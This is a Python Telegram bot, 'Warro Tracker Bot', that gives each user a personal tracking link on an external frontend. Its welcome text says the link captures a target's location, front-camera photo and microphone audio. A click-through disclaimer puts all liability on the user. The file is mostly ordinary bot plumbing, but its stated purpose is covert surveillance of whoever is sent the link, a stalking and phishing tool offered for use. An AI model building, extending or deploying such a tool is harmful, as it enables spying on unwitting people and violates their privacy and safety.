from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import json
import os

# Store accepted user IDs (in-memory)
accepted_users = set()

# File path to store users
USER_FILE = "users.json"

# Telegram Bot Token
BOT_TOKEN = "bot token here"

# Your frontend tracking page base URL
FRONTEND_URL = "https://warro-tracker.vercel.app/"

# Load existing users from file
def load_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            return set(json.load(f))
    return set()

# Save users to file
def save_users(users):
    with open(USER_FILE, "w") as f:
        json.dump(list(users), f)

# /start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users = load_users()
    if user_id not in users:
        users.add(user_id)
        save_users(users)

    welcome_text = (
        "👋 Hello Investigator!\n\n"
        "Welcome to *Warro Tracker Bot* 🔍\n\n"
        "This bot helps you:\n"
        "- Get location (with user permission)\n"
        "- Capture front camera image\n"
        "- Record mic audio\n\n"
        "⚠️ *Disclaimer:*\n"
        "By clicking 'I Accept ✅', you agree to our terms:\n"
        "➡️ Any activity you perform using this bot is *your responsibility*.\n"
        "➡️ The creator of this bot is *not liable* for any misuse."
    )

    keyboard = [[InlineKeyboardButton("I Accept ✅", callback_data="accept")]]
    await update.message.reply_text(
        welcome_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

# /users command (for you only)
async def users_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    YOUR_TELEGRAM_ID = 1944644584  # 🔒 Replace with your own Telegram ID
    if update.effective_user.id == YOUR_TELEGRAM_ID:
        users = load_users()
        await update.message.reply_text(f"📊 Total users: {len(users)}")
    else:
        await update.message.reply_text("❌ Access denied.")

# Inline button handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    username = query.from_user.username or "(no username)"
    await query.answer()

    # Helper: Main menu
    def main_menu():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("Make URL 🔗", callback_data="make_url")],
            [InlineKeyboardButton("Buy Me a Coffee ☕", callback_data="coffee")],
            [InlineKeyboardButton("Account Info 👤", callback_data="account")]
        ])

    # Helper: Back button
    def back_button():
        return InlineKeyboardMarkup([[InlineKeyboardButton("Back to Main Menu 🔙", callback_data="back")]])

    if query.data == "accept":
        accepted_users.add(user_id)

        # Save to user file if not already present
        users = load_users()
        if user_id not in users:
            users.add(user_id)
            save_users(users)

        await query.edit_message_text("✅ Terms accepted!\nChoose an option:", reply_markup=main_menu())

    elif query.data == "make_url":
        if user_id not in accepted_users:
            await query.edit_message_text("❌ Please accept the terms first by using /start.")
            return
        session_link = f"{FRONTEND_URL}/session_{user_id}"
        await query.edit_message_text(
            f"🔗 Your tracking URL:\n{session_link}\n\n"
            "ℹ️ This link remains active while the server is online.",
            reply_markup=back_button()
        )

    elif query.data == "coffee":
        await query.edit_message_text(
            "☕ Support Us!\n\n"
            "If you enjoy using this bot, consider buying us a coffee ❤️\n\n"
            "📲 UPI ID: `your-upi@bank`\n"
            "Thanks for supporting open tools!",
            reply_markup=back_button(),
            parse_mode="Markdown"
        )

    elif query.data == "account":
        await query.edit_message_text(
            f"👤 Account Info:\n\nUser ID: {user_id}\nUsername: {username}",
            reply_markup=back_button()
        )

    elif query.data == "back":
        await query.edit_message_text("🔙 Main Menu:\nChoose an option:", reply_markup=main_menu())

# Start the bot
if __name__ == "__main__":
    print("🤖 Warro Tracker Bot is running...")
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("users", users_count))  # ✅ Optional admin-only command
    app.add_handler(CallbackQueryHandler(button_handler))
    app.run_polling()
